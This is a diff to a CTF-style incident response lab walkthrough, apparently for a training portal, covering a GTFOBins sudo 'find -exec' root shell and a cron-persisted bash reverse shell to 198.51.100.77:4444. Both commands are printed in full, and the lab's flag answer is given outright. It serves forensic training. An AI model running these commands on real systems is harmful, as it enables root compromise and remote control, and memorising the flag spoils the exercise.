@@ -42,9 +42,10 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
      ```bash
      sudo find . -exec /bin/sh \;
      ```
+   - When searching for `sudo` or `find`, the interactive workbench displays the GTFOBins alert highlighting the privilege escalation flaw.
 4. **Identify the GTFOBins Vulnerability**:
    - The UNIX `find` utility supports the `-exec` flag to execute commands on matching files.
-   - When a user has `sudo` privileges for `find` (configured in `/etc/sudoers` as `deploy ALL=(ALL) NOPASSWD: /usr/bin/find`), invoking `/bin/sh` via `-exec` spawns a root shell that bypasses all security restrictions.
+   - When a user has `sudo` privileges for `find` (configured in `/etc/sudoers` as `deploy ALL=(ALL) NOPASSWD: /usr/bin/find`), invoking `/bin/sh` via `-exec` spawns an interactive root subshell that bypasses password authentication.
    - Immediately following this command, the attacker created `/etc/cron.d/cert-sync` and `/opt/cert-tools/.sync.sh`.
 
 ---
@@ -93,26 +94,30 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
 2. **Inspect the Script Content**:
    ```bash
    #!/bin/bash
-   # Automated certificate rotation check
+   # System maintenance sync helper
    # FLAG{crontab_reverse_shell_persisted_victim}
-   bash -i >& /dev/tcp/198.51.100.77/4444 0>&1
+   ATTACKER_IP="198.51.100.77"
+   ATTACKER_PORT=4444
+
+   bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
    ```
 3. **Payload Analysis**:
-   - `bash -i`: Spawns an interactive bash shell.
-   - `>& /dev/tcp/198.51.100.77/4444`: Establishes a raw TCP socket connection to attacker IP `198.51.100.77` on port `4444`, redirecting both standard output and standard error.
-   - `0>&1`: Redirects standard input from the TCP connection, giving the remote attacker full interactive command execution.
-   - Line 3 contains the hidden containment flag: `FLAG{crontab_reverse_shell_persisted_victim}`.
+   - **Reverse Shell Mechanism**: Spawns an interactive bash shell (`bash -i`) redirected over a raw TCP socket (`>& /dev/tcp/... 0>&1`).
+   - **C2 Destination**: `198.51.100.77` on port `4444`.
+   - **Embedded Containment Flag**: Recovered from the script comment line: `FLAG{crontab_reverse_shell_persisted_victim}`.
 
 ---
 
 ### Step 5: Flag Verification & IR Remediation Execution
 
-1. **Verify the Flag**:
+1. **Verify the Flag in the Notebook**:
    - In **Step 5: Flag Verification & IR Remediation**, enter:
      `FLAG{crontab_reverse_shell_persisted_victim}`
+   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`f6e91506b2ce6db278733011060f103779bd018ce35c6076e9f36c0b841331d2`), preventing answers from being viewed in code.
    - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
+   - Upon correct verification, the confirmed **Incident Response Remediation Checklist** unlocks below the input box.
 2. **Submit to Portal**:
-   - Copy `FLAG{crontab_reverse_shell_persisted_victim}` into the CyberLab portal pane to register 100 points.
+   - Copy `FLAG{crontab_reverse_shell_persisted_victim}` into the CyberLab portal pane to register 100 points and record your Host IR competency.
 
 ---
 
